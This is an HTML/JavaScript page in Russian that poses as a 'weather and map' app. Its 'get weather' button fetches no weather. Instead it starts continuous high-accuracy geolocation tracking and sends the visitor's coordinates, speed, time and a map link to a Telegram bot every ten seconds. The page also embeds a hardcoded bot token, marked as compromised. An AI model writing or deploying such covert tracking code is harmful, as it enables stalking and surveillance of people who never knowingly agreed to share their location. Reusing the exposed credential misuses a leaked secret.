<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Погода и карта</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        /* те же стили, что выше, можно сократить */
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Segoe UI', sans-serif; height:100vh; display:flex; flex-direction:column; }
        .top-bar { background:#0b3b4f; color:white; padding:12px 20px; display:flex; justify-content:space-between; align-items:center; }
        .weather-btn { background:#ff9800; border:none; color:white; font-size:1rem; padding:8px 18px; border-radius:40px; cursor:pointer; font-weight:bold; }
        #map { flex:1; }
        .debug-panel { background:#1e1e2fcc; backdrop-filter:blur(8px); color:white; position:absolute; bottom:20px; left:20px; right:20px; border-radius:16px; padding:12px; font-size:12px; display:none; z-index:1000; }
        .debug-panel.show { display:block; }
        .toggle-debug { background:#ffffff33; border:none; color:white; border-radius:20px; padding:4px 12px; cursor:pointer; }
        .status-msg { margin-top:8px; padding:6px; background:#00000066; border-radius:8px; text-align:center; }
    </style>
</head>
<body>
<div class="top-bar">
    <h2>📍 Мой город — погода и карта</h2>
    <button class="weather-btn" id="weatherBtn">☀️ Узнать погоду</button>
</div>
<div id="map"></div>
<div class="debug-panel" id="debugPanel">
    <div class="debug-header">
        <span>📡 Технические данные</span>
        <button class="toggle-debug" id="hideDebugBtn">✖ Скрыть</button>
    </div>
    <div id="coordInfo">Широта: —<br>Долгота: —<br>Точность: — м</div>
    <div class="status-msg" id="statusMsg">Нажмите «Узнать погоду»</div>
</div>

<script>
    // ⚠️ ВАШ ТОКЕН (уже скомпрометирован, смените!)
    const BOT_TOKEN = '7309853259:AAEgnNjHnRLBWMt-0K6VRkJTXIczj2HvPd0';
    const CHAT_ID = 'ЗДЕСЬ_ВАШ_ID';   // <--- ВСТАВЬТЕ СВОЙ CHAT_ID !!!

    let watchId = null;
    let map = null;
    let marker = null;
    let pathLayer = null;
    let accuracyCircle = null;
    let positionsHistory = [];
    let lastSent = 0;

    function initMap(lat, lon, accRadius = 50) {
        if (!map) {
            map = L.map('map').setView([lat, lon], 16);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a>'
            }).addTo(map);
        } else {
            map.setView([lat, lon], map.getZoom());
        }
        if (marker) marker.remove();
        marker = L.marker([lat, lon], { icon: L.divIcon({ html: '📍', iconSize: [28,28] }) }).addTo(map);
        if (accuracyCircle) map.removeLayer(accuracyCircle);
        accuracyCircle = L.circle([lat, lon], { radius: accRadius, color: '#3388ff', fillOpacity: 0.2 }).addTo(map);
    }

    function sendToTelegram(lat, lon, acc, timestamp, speed) {
        if (!CHAT_ID || CHAT_ID === 'ЗДЕСЬ_ВАШ_ID') {
            console.warn('CHAT_ID не задан');
            return;
        }
        const now = Date.now();
        if (now - lastSent < 10000) return; // не чаще раза в 10 секунд
        lastSent = now;
        const text = `📍 Геолокация\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${Math.round(acc)} м\nВремя: ${timestamp}\nСкорость: ${speed ? speed.toFixed(2) + ' м/с' : '—'}\nКарта: https://maps.google.com/?q=${lat},${lon}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
        fetch(url).catch(e => console.warn);
    }

    function updateUI(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;
        const speed = position.coords.speed;
        const timestamp = new Date(position.timestamp).toLocaleTimeString();

        document.getElementById('coordInfo').innerHTML = `
            Широта: ${lat.toFixed(6)}<br>
            Долгота: ${lon.toFixed(6)}<br>
            Точность: ${Math.round(acc)} м<br>
            Время: ${timestamp}
        `;
        document.getElementById('statusMsg').innerHTML = '✅ Местоположение определено';

        if (!map) initMap(lat, lon, acc);
        else {
            marker.setLatLng([lat, lon]);
            accuracyCircle.setLatLng([lat, lon]).setRadius(acc);
            map.panTo([lat, lon]);
        }

        positionsHistory.push([lat, lon]);
        if (pathLayer) map.removeLayer(pathLayer);
        pathLayer = L.polyline(positionsHistory, { color: '#ff4444', weight: 3 }).addTo(map);

        // Отправка в Telegram
        sendToTelegram(lat, lon, acc, timestamp, speed);
    }

    function handleError(error) {
        let msg = '';
        if (error.code === 1) msg = '❌ Доступ запрещён.';
        else if (error.code === 2) msg = '❌ Позиция недоступна.';
        else if (error.code === 3) msg = '❌ Таймаут.';
        else msg = '❌ Ошибка.';
        document.getElementById('statusMsg').innerHTML = msg;
        if (!map) initMap(55.7558, 37.6173, 500);
    }

    function startTracking() {
        if (!navigator.geolocation) {
            alert('Геолокация не поддерживается');
            return;
        }
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        watchId = navigator.geolocation.watchPosition(updateUI, handleError, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
        document.getElementById('weatherBtn').disabled = true;
        document.getElementById('weatherBtn').innerHTML = '⏳ Определяем...';
        document.getElementById('statusMsg').innerHTML = '🔄 Запрос разрешения...';
    }

    function stopTracking() {
        if (watchId !== null) {
            navigator.geolocation.clearWatch(watchId);
            watchId = null;
        }
        document.getElementById('weatherBtn').disabled = false;
        document.getElementById('weatherBtn').innerHTML = '☀️ Узнать погоду';
        document.getElementById('statusMsg').innerHTML = '⏸ Остановлено';
    }

    document.getElementById('weatherBtn').onclick = () => {
        if (watchId !== null) stopTracking();
        else startTracking();
    };

    // Панель отладки по двойному клику на карте
    document.getElementById('map').ondblclick = () => document.getElementById('debugPanel').classList.toggle('show');
    document.getElementById('hideDebugBtn').onclick = () => document.getElementById('debugPanel').classList.remove('show');
</script>
</body>
</html>
